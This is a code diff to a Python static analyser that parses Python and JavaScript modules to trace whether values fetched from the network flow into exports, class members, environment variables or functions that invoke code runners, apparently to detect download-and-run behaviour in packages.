-    return any(m.group() in tainted for m in _DL_HEAD_RE.finditer(expr))
+def _xf_js_mask_line(row):
+    """`row` with each string literal's contents blanked (quotes kept); its length stays."""
+    return _DL_STR_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1]
+                          if len(m.group()) >= 2 else m.group(), row)
 
 
-def _xf_tainted_exports(text):
-    """(values, classes) of `text`: module-level names that hold or return a
-    received value, and {class name: frozenset(method names)} for methods that
-    return one. One indentation-aware pass over masked rows; a function / method
-    body is followed for _XF_WINDOW rows."""
-    if not any(n in text for n in _DL_NEEDLES):
-        return frozenset(), {}
-    rows = _xf_py_mask(text)
-    values, classes, module_taint, local = set(), {}, set(), set()
-    fn = None                                   # (name, deadline row, def indent, owner class|None)
-    cls = None                                  # the open top-level class name
-    for k, row in enumerate(rows):
+def _xf_has_source(expr):
+    return next(_dl_finditer(_DL_SOURCE, expr), None) is not None
+
+
+def _xf_chains(expr):
+    """The member chains named in `expr` (a, a.b.c), spaces taken out."""
+    return {_XF_SPACE_RE.sub("", m.group()) for m in _DL_CHAIN_RE.finditer(expr)}
+
+
+class _XfLocals:
+    """{name: (source, refs)} of assignments [(name, rhs)], merged per name —
+    each read only when _xf_follow reaches it (most locals never are)."""
+
+    __slots__ = ("rhs", "done")
+
+    def __init__(self, local_rows):
+        self.rhs, self.done = {}, {}
+        for name, rhs in local_rows:
+            self.rhs.setdefault(name, []).append(rhs)
+
+    def __contains__(self, name):
+        return name in self.rhs
+
+    def __getitem__(self, name):
+        got = self.done.get(name)
+        if got is None:
+            source, refs = False, frozenset()
+            for rhs in self.rhs[name]:
+                source, refs = source or _xf_has_source(rhs), refs | _xf_chains(rhs)
+            got = self.done[name] = (source, refs)
+        return got
+
+
+_xf_locals = _XfLocals
+
+
+def _xf_follow(exprs, locals_):
+    """(source, refs) of expressions, the local names they use followed to
+    what those are assigned (_XF_LOCAL_DEPTH deep)."""
+    source, refs = False, set()
+    for expr in exprs:
+        source = source or _xf_has_source(expr)
+        refs |= _xf_chains(expr)
+    frontier = {c.split(".")[0] for c in refs}
+    seen = set(frontier)
+    for _ in range(_XF_LOCAL_DEPTH):
+        nxt = set()
+        for name in frontier:
+            if name in locals_:
+                s, r = locals_[name]
+                source = source or s
+                refs |= r
+                nxt |= {c.split(".")[0] for c in r} - seen
+        seen |= nxt
+        frontier = nxt
+        if not frontier:
+            break
+    return source, frozenset(refs)
+
+
+def _xf_delivers(body, params):
+    """Does a body that receives a value hand it to a callback: a parameter
+    it calls, or a Promise's resolve (https.get(u, (r) => … cb(data)))?"""
+    joined = "\n".join(body)
+    if not any(n in joined for n in _DL_NEEDLES):
+        return False
+    if not any(any(n in row for n in _DL_NEEDLES) and _xf_has_source(row) for row in body):
+        return False
+    names = set(params)
+    for row in body:
+        if "Promise" in row:
+            names.update(m.group("name") for m in _XF_PROMISE_RE.finditer(row))
+    names -= _XF_NOT_PARAMS
+    return bool(names) and any(m.group("name") in names for row in body for m in _XF_CALL_NAME_RE.finditer(row))
+
+
+def _xf_ret(returns, local_rows, body=(), params=()):
+    """(source, refs) of a body: its return expressions, and the local names
+    they use followed to what those are assigned; a body that hands what it
+    receives to a callback holds a received value too (_xf_delivers)."""
+    source, refs = _xf_follow(returns, _xf_locals(local_rows))
+    if not source and body and _xf_delivers(body, params):
+        source = True
+    return source, refs
+
+
+def _xf_params(row, at):
+    """The parameter names of the function whose header starts at column
+    `at` of `row`: its first (…) there, or an arrow's single name."""
+    one = _XF_ARROW_ONE_RE.match(row, at)
+    if one is not None:
+        return [one.group("name")]
+    i = row.find("(", at)
+    m = _XF_PARAMS_RE.match(row, i) if i >= 0 else None
+    if m is None:
+        return []
+    out = []
+    for item in m.group("params").split(","):
+        p = _XF_PARAM_NAME_RE.match(item)
+        if p is not None:
+            out.append(p.group("name"))
+    return out
+
+
+class _XfModule:
+    """What the follower reads of one module (see the section comment)."""
+
+    __slots__ = ("key", "lang", "path", "text", "defs", "classes", "imports", "exports", "reexports", "stars",
+                 "default", "default_module", "env", "bodies")
+
+    def __init__(self, key, lang, path, text):
+        self.key, self.lang, self.path, self.text = key, lang, path, text
+        self.defs = {}            # name -> (source, refs): functions and values
+        self.classes = {}         # class or object literal -> {member: ((source, refs), static)}
+        self.imports = {}         # local name -> (module key|None, imported name|None, kind, label)
+        self.exports = {}         # npm: exported name -> local name, or ("ref", chain)
+        self.reexports = {}       # npm: exported name -> (module key|None, name)
+        self.stars = []           # npm: module keys of `export * from`
+        self.default = None       # npm: the default export's local name, or "<default>"
+        self.default_module = None   # npm: module.exports = require(…)'s module key
+        self.env = {}             # environment variable -> (source, refs) of what it is set to
+        self.bodies = {}          # symbol -> (parameters, body rows) of a function that names a code runner
+
+
+def _xf_merge(old, new):
+    return (old[0] or new[0], old[1] | new[1])
+
+
+def _xf_member(mod, cls, name, ret, static):
+    """Add (or merge into) member `name` of class or object literal `cls`."""
+    meths = mod.classes.setdefault(cls, {})
+    if name in meths:
+        old, was_static = meths[name]
+        meths[name] = (_xf_merge(old, ret), was_static)
+    else:
+        meths[name] = (ret, static)
+
+
+def _xf_body(mod, sym, params, body):
+    """Keep a function's body for the runner test when it names a code runner."""
+    if params and sym not in mod.bodies:
+        joined = "\n".join(body)
+        if any(n in joined for n in _DL_RUN_NEEDLES):
+            mod.bodies[sym] = (params, body)
+
+
+def _xf_writes(mod, masked, row_cls, lang):
+    """Read the writes into a member of a module-level name (CACHE['c'] = …,
+    cache.code = …, an object literal's api.x = …) and of an instance
+    (self.data = … / this.data = … in a class's body) like assignments of
+    it: what they assign, the file's assignments followed (_xf_follow)."""
+    found = []
+    for k, row in enumerate(masked):
+        if "=" not in row or ("." not in row and "[" not in row) or len(row) > _DL_LONG_ROW:
+            continue                                    # (a member write names a member: `.x` or `[…]`)
+        for m in _XF_MEMBER_WRITE_RE.finditer(row):
+            name, attr = m.group("name"), m.group("attr")
+            if name in ("self", "this", "cls"):
+                if attr is None or row_cls[k] is None:
+                    continue
+                found.append((("member", row_cls[k], attr), m.group("rhs")))
+            elif attr is not None and name in mod.classes:
+                found.append((("member", name, attr), m.group("rhs")))
+            elif name in mod.defs:
+                found.append((("def", name), m.group("rhs")))
+    if not found:
+        return
+    pairs = []
+    for row in masked:
+        if "=" not in row or len(row) > _DL_LONG_ROW:
+            continue
+        if lang == "py":
+            a = _XF_ASSIGN_RE.match(row)
+            if a is not None:
+                pairs.append((a.group("name"), a.group("rhs")))
+        else:
+            pairs.extend((m.group("name"), m.group("rhs")) for m in _XF_JS_LOCAL_RE.finditer(row))
+    locals_ = _xf_locals(pairs)
+    for target, rhs in found:
+        ret = _xf_follow([rhs], locals_)
+        if target[0] == "member":
+            _xf_member(mod, target[1], target[2], ret, target[1] not in mod.defs and _xf_is_object(mod, target[1]))
+        else:
+            mod.defs[target[1]] = _xf_merge(mod.defs[target[1]], ret)
+
+
+def _xf_is_object(mod, cls):
+    """Is `cls` an object literal (its members are all static)?"""
+    meths = mod.classes.get(cls, {})
+    return bool(meths) and all(static for _ret, static in meths.values())
+
+
+def _xf_py_parse(mod, pkg_parts):
+    """Fill `mod` from its Python text (see the section comment)."""
+    if len(mod.text) > _XF_MAX_CHARS:
+        return
+    code = mod.text
+    masked = _xf_py_mask(code)
+    n = len(masked)
+    row_cls = [None] * n
+    cls, cls_indent, body_indent, k = None, -1, -1, 0
+    while k < n:
+        row = masked[k]
         stripped = row.strip()
         if not stripped:
+            k += 1
             continue
         indent = len(row) - len(row.lstrip())
-        if fn is not None and (indent <= fn[2] or k > fn[1]):
-            fn, local = None, set()
-        if indent == 0 and cls is not None:
-            cls = None                          # any top-level line ends the class scope
-        cm = _XF_CLASS_RE.match(row)
-        if cm is not None and indent == 0:
-            cls = cm.group("name")
-            classes.setdefault(cls, set())
-            continue
-        d = _XF_DEF_RE.match(row)
-        if d is not None:
+        if cls is not None and indent <= cls_indent:
+            cls = None
+        if cls is not None and body_indent < 0:
+            body_indent = indent                        # the class body's own level
+        cm = _XF_CLASS_RE.match(row) if "class" in row else None
+        if cm is not None:
             if indent == 0:
-                fn, local = (d.group("name"), k + _XF_WINDOW, 0, None), set()
-            elif cls is not None:
-                fn, local = (d.group("name"), k + _XF_WINDOW, indent, cls), set()
-            else:
-                fn, local = None, set()
+                cls, cls_indent, body_indent = cm.group("name"), indent, -1
+                mod.classes.setdefault(cls, {})
+            k += 1
             continue
-        if fn is not None:
-            r = _XF_RETURN_RE.match(row)
-            if r is not None and _xf_expr_carries(r.group("expr"), local | module_taint):
-                if fn[3] is None:
-                    if len(values) < _XF_MAX_EXPORTS:
-                        values.add(fn[0])
-                else:
-                    classes.setdefault(fn[3], set()).add(fn[0])
-                fn, local = None, set()
+        d = _XF_DEF_RE.match(row) if "def" in row else None
+        if d is not None and (indent == 0 or (cls is not None and indent > cls_indent)):
+            j = k + 1
+            while j < n and j - k <= _XF_WINDOW:
+                r = masked[j]
+                if r.strip() and len(r) - len(r.lstrip()) <= indent:
+                    break
+                j += 1
+            inline = _XF_DEF_END_RE.search(row, d.end())          # def f(x): return x
+            body = ([row[inline.end():]] if inline is not None and row[inline.end():].strip() else []) + masked[k + 1:j]
+            params = _xf_params(row, d.end() - 1)
+            returns = [m.group("expr") for m in (_XF_RETURN_RE.match(r) for r in body if "return" in r) if m is not None]
+            locals_ = [(a.group("name"), a.group("rhs")) for a in (_XF_ASSIGN_RE.match(r) for r in body if "=" in r)
+                       if a is not None]
+            ret = _xf_ret(returns, locals_, body, params)
+            name = d.group("name")
+            if cls is None:
+                mod.defs.setdefault(name, ret)
+                _xf_body(mod, name, params, body)
+            else:
+                static = k > 0 and _XF_STATIC_RE.match(masked[k - 1]) is not None
+                _xf_member(mod, cls, name, ret, static)
+                _xf_body(mod, cls + "." + name, params, body)
+                for t in range(k, j):
+                    row_cls[t] = cls
+            k = j
+            continue
+        a = (_XF_ASSIGN_RE.match(row) if "=" in row and (indent == 0 or (cls is not None and indent == body_indent))
+             else None)
+        if a is not None and len(a.group("rhs")) <= _DL_LONG_ROW:
+            ret = (_xf_has_source(a.group("rhs")), frozenset(_xf_chains(a.group("rhs"))))
+            if indent == 0:
+                mod.defs.setdefault(a.group("name"), ret)
+            elif cls is not None and indent == body_indent:   # a class attribute: data = requests.get(…).text
+                _xf_member(mod, cls, a.group("name"), ret, True)
+        k += 1
+    joined = "\n".join(masked)
+    for m in _XF_FROM_RE.finditer(joined):
+        target = _xf_resolve(m.group("mod"), pkg_parts)
+        names = m.group("names").strip()
+        if names == "*":
+            mod.imports.setdefault("*" + (target or ""), (target, "*", "star", target))
+            continue
+        for item in names.strip("()").split(","):
+            parts = item.split()
+            if not parts:
                 continue
-        a = _XF_ASSIGN_RE.match(row)
-        if a is not None and len(a.group("rhs")) <= _DL_LONG_ROW and _xf_expr_carries(
-                a.group("rhs"), module_taint if indent == 0 else local | module_taint):
-            if indent == 0 and len(values) < _XF_MAX_EXPORTS:
-                module_taint.add(a.group("name"))
-                values.add(a.group("name"))
-            elif fn is not None:
-                local.add(a.group("name"))
-    return frozenset(values), {c: frozenset(ms) for c, ms in classes.items() if ms}
+            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
+            mod.imports[local] = (target, parts[0], "name", target)
+    for m in _XF_IMPORT_RE.finditer(joined):
+        for item in m.group("names").split(","):
+            parts = item.split()
+            if not parts:
+                continue
+            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
+            mod.imports[local] = (parts[0], None, "module", parts[0])
+    code_rows = code.split("\n")
+    if "import_module" in code or "__import__" in code:
+        for k, row in enumerate(code_rows):
+            if "import" not in row or len(row) > _DL_LONG_ROW:
+                continue
+            for m in _XF_PY_DYN_IMPORT_RE.finditer(row):
+                if masked[k][m.start():m.start() + 1] != row[m.start()]:
+                    continue                            # in a comment or a docstring
+                target = _xf_resolve(m.group("mod"), pkg_parts)
+                if target is None:
+                    continue
+                local = m.group("local")
+                parts = target.split(".")
+                if m.group("fn") == "__import__" and "fromlist" not in m.group("rest") and len(parts) > 1:
+                    # __import__('a.b') is the top package a; a.b is a member of it
+                    mod.imports[local] = (parts[0], None, "module", parts[0])
+                    for i in range(2, len(parts) + 1):
+                        sub = ".".join(parts[:i])
+                        mod.imports[local + sub[len(parts[0]):]] = (sub, None, "module", sub)
+                else:
+                    mod.imports[local] = (target, None, "module", target)
+    for k, row in enumerate(code_rows):
+        if "environ" not in row or len(row) > _DL_LONG_ROW:
+            continue
+        for m in _XF_PY_ENV_WRITE_RE.finditer(row):
+            if masked[k][m.start():m.start() + 1] != row[m.start()]:
+                continue                                # in a comment or a docstring
+            rhs = masked[k][m.start("rhs"):m.end("rhs")]
+            old = mod.env.get(m.group("var"), (False, frozenset()))
+            mod.env[m.group("var")] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
+    _xf_writes(mod, masked, row_cls, "py")
 
 
-def _xf_py_instances(text, cname):
-    """Local names assigned an instance of class `cname` (`v = Cname(...)` or
-    `v = mod.Cname(...)`), for seeding `v.method` chains."""
-    rx = re.compile(r"(?<![\w.])(?P<var>[A-Za-z_]\w*)[ \t]*=[ \t]*(?:[\w.]+\.)?" + re.escape(cname) + r"[ \t]*\(")
-    return {m.group("var") for m in rx.finditer(text)}
+def _xf_js_body(masked, k, at):
+    """(rows, end): the rows of the brace body that starts at the first '{'
+    at or after column `at` of row k, up to its closing '}' (or
+    _XF_WINDOW rows), the first cut at that '{'; ([], k) when there is none."""
+    first = masked[k].find("{", at)
+    if first < 0:
+        return [], k
+    rows, depth = [], 0
+    for j in range(k, min(len(masked), k + _XF_WINDOW + 1)):
+        row = masked[j][first:] if j == k else masked[j]
+        cut = None
+        for b in _XF_BRACE_RE.finditer(row):
+            depth += 1 if b.group() == "{" else -1
+            if depth == 0:
+                cut = b.end()
+                break
+        rows.append(row if cut is None else row[:cut])
+        if cut is not None:
+            return rows, j
+    return rows, min(len(masked), k + _XF_WINDOW + 1) - 1
+
+
+def _xf_js_ret(rows, params=()):
+    returns = [m.group("expr") for row in rows for m in _XF_JS_RETURN_RE.finditer(row)]
+    locals_ = [(m.group("name"), m.group("rhs")) for row in rows for m in _XF_JS_LOCAL_RE.finditer(row)]
+    return _xf_ret(returns, locals_, rows, params)
+
+
+def _xf_js_fn(masked, k, at):
+    """((source, refs), params, body rows) of the function whose header
+    starts at column `at` of row k: its brace body, or an arrow's expression."""
+    row = masked[k]
+    params = _xf_params(row, at)
+    arrow = row.find("=>", at)
+    brace = row.find("{", at)
+    if arrow >= 0 and (brace < 0 or arrow < brace):
+        rest = row[arrow + 2:].lstrip()
+        if not rest.startswith("{"):
+            return _xf_ret([rest], [], [rest], params), params, [rest]
+        body, _end = _xf_js_body(masked, k, arrow)
+        return _xf_js_ret(body, params), params, body
+    body, _end = _xf_js_body(masked, k, at)
+    return _xf_js_ret(body, params), params, body
+
+
+def _xf_js_destr(names):
+    """[(export/property name, local name)] for a `{ a, b as c, d: e, 'f': g }` list."""
+    out = []
+    for item in names.split(","):
+        parts = [p.strip("'\"`") for p in item.replace(":", " ").replace(" as ", " ").split()]
+        parts = [p for p in parts if p]
+        if len(parts) == 1:
+            out.append((parts[0], parts[0]))
+        elif len(parts) >= 2:
+            out.append((parts[0], parts[1]))
+    return out
+
+
+def _xf_js_row_classes(rows):
+    """For each masked row, the name of the class whose body encloses it (or
+    None), and how deep in that body the row starts (1: the class body's own
+    level) — a brace-depth pass pairing `class NAME … {` with its `}`."""
+    row_class, row_level = [None] * len(rows), [0] * len(rows)
+    depth, stack, pending = 0, [], None         # stack entries: (class name, body depth)
+    for k, row in enumerate(rows):
+        if stack:
+            row_class[k], row_level[k] = stack[-1][0], depth - stack[-1][1]
+        if "{" not in row and "}" not in row and "class" not in row:
+            continue
+        events = [(m.start(), "c", m.group("name")) for m in _XF_JS_CLASS_RE.finditer(row)]
+        events += [(m.start(), m.group(), None) for m in _XF_BRACE_RE.finditer(row)]
+        events.sort()
+        for _pos, kind, name in events:
+            if kind == "c":
+                pending = name
+            elif kind == "{":
+                if pending is not None:
+                    stack.append((pending, depth))
+                    pending = None
+                depth += 1
+            else:
+                depth -= 1
+                if stack and stack[-1][1] == depth:
+                    stack.pop()
+    return row_class, row_level
+
+
+def _xf_js_key(rel, spec):
+    """The module key a relative import `spec` of the file `rel` names, else
+    None (a bare name is another package); '.' and '..' name an index."""
+    if not spec.startswith("."):
+        return None
+    key = _xf_js_norm(posixpath.normpath(posixpath.join(posixpath.dirname(rel), spec)))
+    return "index" if key == "." else key
+
+
+def _xf_js_views(text):
+    """(code rows, masked rows) of a JavaScript text: comments blanked, and
+    in the masked rows string contents too; rows keep their length, and a
+    row longer than _DL_LONG_ROW (minified code) is not read (blank)."""
+    code, masked, in_block = [], [], False
+    for row in text.split("\n"):
+        if len(row) > _DL_LONG_ROW:
+            code.append("")
+            masked.append("")
+            continue
+        m = _xf_js_mask_line(row) if ("'" in row or '"' in row or "`" in row) else row
+        if not in_block and "/" not in m:                  # (no comment starts on it)
+            code.append(row)
+            masked.append(m)
+            continue
+        spans, i = [], 0
+        while i <= len(m):
+            if in_block:
+                e = m.find("*/", i)
+                if e < 0:
+                    spans.append((i, len(m)))
+                    break
+                spans.append((i, e + 2))
+                i, in_block = e + 2, False
+                continue
+            a = m.find("/*", i)
+            lc = _XF_JS_LINE_COMMENT_RE.search(m, i)
+            if lc is not None and (a < 0 or lc.start() < a):
+                spans.append((lc.start(), len(m)))
+                break
+            if a < 0:
+                break
+            e = m.find("*/", a + 2)
+            if e < 0:
+                spans.append((a, len(m)))
+                in_block = True
+                break
+            spans.append((a, e + 2))
+            i = e + 2
+        for a, b in spans:
+            m = m[:a] + " " * (b - a) + m[b:]
+            row = row[:a] + " " * (b - a) + row[b:]
+        code.append(row)
+        masked.append(m)
+    return code, masked
+
+
+def _xf_js_dirname_specs(code):
+    """`code` with each path built from the module's own directory
+    (path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`) written
+    as the relative specifier it is, './x', padded to the length it replaces."""
+    def spec(m):
+        rel = m.group("a") if m.group("a") is not None else (m.group("b") or m.group("c"))[1:]
+        while rel.startswith("./"):
+            rel = rel[2:]
+        new = "'./" + rel.lstrip("/") + "'"
+        return new.ljust(len(m.group())) if len(new) <= len(m.group()) else m.group()
+    return _XF_JS_DIRNAME_RE.sub(spec, code)
+
+
+def _xf_js_object(mod, rows, masked, k, at, cls):
+    """Read the object literal whose '{' is at column `at` of row k as `cls`,
+    its members static (see the section comment); the number of members."""
+    count, depth, expect = 0, 0, False
+    for j in range(k, min(len(masked), k + _XF_OBJECT_ROWS)):
+        row, code_row = masked[j], rows[j]
+        i = at if j == k else 0
+        n = len(row)
+        while i < n:
+            ch = row[i]
+            if expect and depth == 1 and ch != " " and ch != "\t":
+                expect = False
+                m = _XF_JS_MEMBER_RE.match(code_row, i)
+                if m is not None:
+                    name = m.group("name")
+                    if m.group("method") is not None:
+                        ret, params, body = _xf_js_fn(masked, j, m.start("name"))
+                        _xf_body(mod, cls + "." + name, params, body)
+                    elif m.group("colon") is not None:
+                        value = row[m.end():]
+                        if _XF_JS_FN_VALUE_RE.match(value.lstrip()):
+                            ret, params, body = _xf_js_fn(masked, j, m.end())
+                            _xf_body(mod, cls + "." + name, params, body)
+                        else:
+                            expr = value.split(",")[0]
+                            ret = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
+                    else:
+                        ret = (False, frozenset({name}))             # { pull }: the name it holds
+                    _xf_member(mod, cls, name, ret, True)
+                    count += 1
+            if ch in "{([":
+                depth += 1
+                if depth == 1:
+                    expect = True
+            elif ch in "})]":
+                depth -= 1
+                if depth <= 0:
+                    return count
+            elif ch == "," and depth == 1:
+                expect = True
+            i += 1
+    return count
+
+
+def _xf_js_parse(mod, rel):
+    """Fill `mod` from its JavaScript text (see the section comment)."""
+    if len(mod.text) > _XF_MAX_CHARS:
+        return
+    rows, masked = _xf_js_views(mod.text)
+    code = "\n".join(rows)
+    if "__dirname" in code:
+        code = _xf_js_dirname_specs(code)
+    row_class, row_level = _xf_js_row_classes(masked)
+    objects = {}                                # row -> the const an object literal there is read as
+    for k, row in enumerate(masked):
+        if "{" not in row or row_class[k] is not None or not any(w in row for w in _XF_JS_OBJECT_WORDS):
+            continue
+        for m in _XF_JS_OBJECT_RE.finditer(row):
+            name = m.group("name")
+            cls = name if name is not None else "<exports>" if "module" in m.group() else "<default>"
+            if _xf_js_object(mod, rows, masked, k, m.end() - 1, cls) and name is not None:
+                objects[k] = name
+    # (each pattern is tried only where the words it needs are: litellm's and
+    # webpack's thousands of files are read in a few seconds)
+    for k, row in enumerate(masked):
+        cls = row_class[k]
+        for m in (_XF_JS_FUNC_RE.finditer(row) if "function" in row else ()):
+            if m.group("name") not in mod.defs:
+                ret, params, body = _xf_js_fn(masked, k, m.start())
+                mod.defs[m.group("name")] = ret
+                _xf_body(mod, m.group("name"), params, body)
+        if cls is not None:
+            for m in (_XF_JS_METHOD_RE.finditer(row) if "{" in row and ")" in row else ()):
+                name = m.group("name")
+                if name in _XF_JS_KEYWORDS:
+                    continue
+                ret, params, body = _xf_js_fn(masked, k, m.start("name"))
+                _xf_member(mod, cls, name, ret, m.group("static") is not None)
+                _xf_body(mod, cls + "." + name, params, body)
+            if row_level[k] == 1 and "=" in row:
+                f = _XF_JS_FIELD_RE.match(row)
+                if f is not None and f.group("name") not in _XF_JS_KEYWORDS and len(f.group("rhs")) <= _DL_LONG_ROW:
+                    rhs, name = f.group("rhs"), f.group("name")
+                    if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):              # pull = async () => { … }
+                        ret, params, body = _xf_js_fn(masked, k, f.start("rhs"))
+                        _xf_body(mod, cls + "." + name, params, body)
+                    else:
+                        ret = (_xf_has_source(rhs), frozenset(_xf_chains(rhs)))
+                    _xf_member(mod, cls, name, ret, f.group("static") is not None)
+            continue
+        cm = _XF_JS_CLASS_RE.search(row) if "class" in row else None
+        if cm is not None:
+            mod.classes.setdefault(cm.group("name"), {})
+        m = _XF_JS_CONST_RE.search(row) if "=" in row and ("const" in row or "let" in row or "var" in row) else None
+        if m is not None and len(m.group("rhs")) <= _DL_LONG_ROW and objects.get(k) != m.group("name"):
+            rhs = m.group("rhs")
+            if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):
+                ret, params, body = _xf_js_fn(masked, k, m.start("rhs"))
+                mod.defs.setdefault(m.group("name"), ret)
+                _xf_body(mod, m.group("name"), params, body)
+            else:
+                mod.defs.setdefault(m.group("name"), (_xf_has_source(rhs), frozenset(_xf_chains(rhs))))
+    esm = any(w in code for w in ("export ", "export\t", "export{", "export*"))
+    none = ()
+    for m in (_XF_JS_EXPORT_DECL_RE.finditer(code) if esm else none):
+        mod.exports[m.group("name")] = m.group("name")
+    for m in (_XF_JS_EXPORT_DEFAULT_DECL_RE.finditer(code) if esm and "default" in code else none):
+        name = m.group("fn") or m.group("cls")
+        if name:
+            mod.default = name
+        elif "function" in m.group(0):
+            k = code.count("\n", 0, m.start())
+            ret, params, body = _xf_js_fn(masked, k, m.start() - (code.rfind("\n", 0, m.start()) + 1))
+            mod.defs["<default>"] = ret
+            _xf_body(mod, "<default>", params, body)
+            mod.default = "<default>"
+    for m in (_XF_JS_EXPORT_DEFAULT_RE.finditer(code) if esm and "default" in code else none):
+        mod.default = m.group("name")
+    if "<default>" in mod.classes and mod.default is None:
+        mod.default = "<default>"                   # export default { … }
+    for m in (_XF_JS_EXPORT_LIST_RE.finditer(code) if esm else none):
+        for local, exported in _xf_js_destr(m.group("names")):
+            mod.exports[exported] = local
+    for m in (_XF_JS_EXPORT_FROM_RE.finditer(code) if esm and "from" in code else none):
+        key = _xf_js_key(rel, m.group("mod"))
+        for name, exported in _xf_js_destr(m.group("names")):
+            mod.reexports[exported] = (key, name)
+    for m in (_XF_JS_EXPORT_STAR_RE.finditer(code) if esm and "from" in code else none):
+        key = _xf_js_key(rel, m.group("mod"))
+        if m.group("ns"):
+            mod.reexports[m.group("ns")] = (key, None)
+        elif key is not None:
+            mod.stars.append(key)
+    for name in mod.classes.get("<exports>", {}):
+        mod.exports.setdefault(name, ("ref", "<exports>." + name))
+    cjs = "module" in code
+    for m in (_XF_JS_MODEXP_OBJ_RE.finditer(code) if cjs else none):
+        for exported, local in _xf_js_destr(m.group("names")):
+            mod.exports[exported] = local
+    for m in (_XF_JS_MODEXP_PROP_RE.finditer(code) if "exports" in code else none):
+        name = m.group("name") or m.group("qname")
+        rhs = m.group("rhs").strip().rstrip(";").strip()
+        if rhs in ("void 0", "undefined"):
+            continue
+        if _DL_NAME_RE.fullmatch(rhs) is not None:
+            mod.exports[name] = rhs
+            continue
+        k = code.count("\n", 0, m.start("rhs"))
+        at = m.start("rhs") - (code.rfind("\n", 0, m.start("rhs")) + 1)
+        local = "exports." + name
+        if _XF_JS_FN_VALUE_RE.match(rhs):
+            ret, params, body = _xf_js_fn(masked, k, at)
+            mod.defs[local] = ret
+            _xf_body(mod, local, params, body)
+        else:
+            expr = masked[k][at:] if k < len(masked) else rhs
+            mod.defs[local] = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
+        mod.exports[name] = local
+    for m in (_XF_JS_MODEXP_ALL_RE.finditer(code) if cjs else none):
+        mod.default = m.group("name")
+    for m in (_XF_JS_MODEXP_CLASS_RE.finditer(code) if cjs and "class" in code else none):
+        mod.default = m.group("name")
+    for m in (_XF_JS_MODEXP_REQ_RE.finditer(code) if cjs and "require(" in code else none):
+        mod.default_module = _xf_js_key(rel, m.group("mod"))
+    for m in (_XF_JS_MODEXP_FN_RE.finditer(code) if cjs else none):
+        k = code.count("\n", 0, m.end())
+        ret, params, body = _xf_js_fn(masked, k, m.end() - (code.rfind("\n", 0, m.end()) + 1))
+        mod.defs["<default>"] = ret
+        _xf_body(mod, "<default>", params, body)
+        mod.default = "<default>"
+    for m in (_XF_JS_DEFINE_RE.finditer(code) if "defineProperty" in code else none):
+        mod.exports.setdefault(m.group("name"), ("ref", _XF_SPACE_RE.sub("", m.group("ref"))))
+    req, dyn, imp = "require(" in code, "import(" in code, "import" in code and "from" in code
+    for rx in ((_XF_JS_REQ_DESTR_RE,) if req else ()) + ((_XF_JS_DYN_DESTR_RE,) if dyn else ()):
+        for m in rx.finditer(code):
+            key = _xf_js_key(rel, m.group("mod"))
+            for exp, local in _xf_js_destr(m.group("names")):
+                mod.imports[local] = (key, exp, "name", m.group("mod"))
+    for rx in ((_XF_JS_REQ_NS_RE,) if req else ()) + ((_XF_JS_DYN_NS_RE,) if dyn else ()):
+        for m in rx.finditer(code):
+            mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
+    for m in (_XF_JS_REQ_MEMBER_RE.finditer(code) if req else none):
+        mod.imports[m.group("local")] = (_xf_js_key(rel, m.group("mod")), m.group("name"), "name", m.group("mod"))
+    for m in (_XF_JS_IMP_NAMED_RE.finditer(code) if imp else none):
+        key = _xf_js_key(rel, m.group("mod"))
+        for exp, local in _xf_js_destr(m.group("names")):
+            mod.imports[local] = (key, exp, "name", m.group("mod"))
+    for m in (_XF_JS_IMP_NS_RE.finditer(code) if imp else none):
+        mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
+    for m in (_XF_JS_IMP_DEFAULT_RE.finditer(code) if imp else none):
+        mod.imports[m.group("name")] = (_xf_js_key(rel, m.group("mod")), "default", "default", m.group("mod"))
+    for k, row in enumerate(rows):
+        if "env" not in row:
+            continue
+        for m in _XF_JS_ENV_WRITE_RE.finditer(row):
+            var = m.group("a") or m.group("b")
+            rhs = masked[k][m.start("rhs"):m.end("rhs")]
+            old = mod.env.get(var, (False, frozenset()))
+            mod.env[var] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
+    _xf_writes(mod, masked, row_class, "js")
+
+
+class _XfPackage:
+    """One package's modules, what their names resolve to, and which symbols
+    hold a received value (see the section comment)."""
+
+    def __init__(self, mods):
+        self.mods = mods                          # key -> _XfModule
+        self.exported = {}                        # (key, name) -> resolve_export(key, name), from the top
+
+    def resolve_local(self, mod, name, depth=0):
+        """What `name` is in `mod`: ('sym', (key, name)), ('class', (key, cls)),
+        ('module', key), or None."""
+        if depth > _XF_MAX_DEPTH:
+            return None
+        if name in mod.defs:
+            return "sym", (mod.key, name)
+        if name in mod.classes:
+            return "class", (mod.key, name)
+        imp = mod.imports.get(name)
+        if imp is not None:
+            return self.resolve_import(imp, depth + 1)
+        return None
+
+    def resolve_import(self, imp, depth=0):
+        key, name, kind, _label = imp
+        if key is None:
+            return None
+        if key not in self.mods:                    # a namespace package: from . import mod
+            sub = f"{key}.{name}" if kind == "name" and name else None
+            return ("module", sub) if sub in self.mods else None
+        if kind == "module":
+            return "module", key
+        return self.resolve_export(key, name, depth + 1)
+
+    def export(self, key, name):
+        """resolve_export(key, name) from the top, remembered (the seeds of
+        every module of a package ask for the same exports)."""
+        got = self.exported.get((key, name), self)
+        if got is self:
+            got = self.exported[(key, name)] = self.resolve_export(key, name)
+        return got
+
+    def resolve_export(self, key, name, depth=0):
+        """What module `key` exports as `name` (see resolve_local)."""
+        mod = self.mods.get(key)
+        if mod is None or depth > _XF_MAX_DEPTH:
+            return None
+        if mod.lang == "py":
+            got = self.resolve_local(mod, name, depth + 1)
+            if got is not None:
+                return got
+            sub = key + "." + name
+            return ("module", sub) if sub in self.mods else None
+        if name == "default":
+            if mod.default is not None:
+                return self.resolve_local(mod, mod.default, depth + 1)
+            if mod.default_module is not None:
+                return ("module", mod.default_module) if mod.default_module in self.mods else None
+            # else exports.default = … (TypeScript's and Babel's output), read below
+        exp = mod.exports.get(name)
+        if isinstance(exp, tuple):
